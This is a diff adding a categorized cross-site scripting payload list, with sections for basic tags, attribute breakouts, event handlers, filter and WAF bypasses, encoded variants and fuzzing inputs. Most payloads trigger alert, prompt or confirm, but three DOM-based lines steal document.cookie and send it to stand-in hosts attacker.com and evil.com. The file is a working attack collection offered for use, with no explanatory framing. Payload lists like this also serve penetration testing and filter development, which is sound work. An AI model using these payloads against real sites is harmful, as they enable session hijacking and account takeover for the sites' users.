@@ -1,0 +1,104 @@
+# --------------------------
+# 🧩 BASIC XSS PAYLOADS
+# --------------------------
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<body onload=alert(1)>
+<video><source onerror="alert(1)">
+<math><a xlink:href="javascript:alert(1)">X</a></math>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<embed src=javascript:alert(1)>
+<svg><script>alert(1)</script></svg>
+<object data=javascript:alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+
+# --------------------------
+# 🔄 ATTRIBUTE CONTEXT BYPASSES
+# --------------------------
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" onmouseover=alert(1) x="
+' onmouseover=alert(1) x='
+" onclick=alert(1) x="
+' onclick=alert(1) x='
+
+# --------------------------
+# 🧬 EVENT-BASED PAYLOADS
+# --------------------------
+<svg id=x tabindex=1 onfocus=alert(1) autofocus>
+<svg id=x tabindex=1 onload=alert(1)>
+<svg id=x onpointerenter=alert(1) tabindex=1 autofocus>
+<svg id=x onmouseenter=alert(1) tabindex=1 autofocus>
+<svg onbeforeactivate=alert(1)>
+
+# --------------------------
+# 🔁 POLYGLOT & FILTER BYPASS
+# --------------------------
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<scr<script>ipt>alert(String.fromCharCode(88,83,83))</scr</script>ipt>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC="jav\x0Aascript:alert('XSS');">
+<IMG SRC="jav\x09ascript:alert('XSS');">
+<IMG SRC="jav\x0Dascript:alert('XSS');">
+
+# --------------------------
+# 🌐 HTML5 / MODERN PAYLOADS
+# --------------------------
+<iframe srcdoc="<script>alert(1)</script>">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName=innerHTML to="<img src=x onerror=alert(1)>">
+<svg><foreignObject onload=alert(1)>
+<video autoplay><source onerror=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+
+# --------------------------
+# 📦 OBFUSCATED / ENCODED
+# --------------------------
+<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
+<svg/onload=String.fromCharCode(97,108,101,114,116,40,49,41)>
+<IMG SRC=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+# --------------------------
+# 🔍 DOM-BASED XSS
+# --------------------------
+<svg><script>location='//attacker.com?c='+document.cookie</script></svg>
+<svg><script>fetch('https://attacker.com/'+document.cookie)</script></svg>
+"><script>new Image().src='//evil.com?'+document.cookie</script>
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+
+# --------------------------
+# 🎯 REAL-WORLD / WAF BYPASS
+# --------------------------
+"><svg/onload=alert(1)>
+'><svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><body onload=alert(1)>
+<svg onload=confirm(1)>
+"'><img src=x onerror=alert(1)>
+
+# --------------------------
+# 🧪 PROMPT / CONFIRM / CUSTOM
+# --------------------------
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<svg/onload=prompt(1)>
+<img src=x onerror=confirm(1)>
+<iframe src=javascript:prompt(1)>
+
+# --------------------------
+# 🧠 ADVANCED INPUT CONTEXTS (FOR FUZZING)
+# --------------------------
+"><svg/onload=alert(1)>
+"><script>alert(1)</script>
+'"><img src=x onerror=alert(1)>
+`"><iframe src=javascript:alert(1)>
+"><input autofocus onfocus=alert(1)>
+" accesskey="X" onclick="alert(1)" x="
+
+# END OF LIST
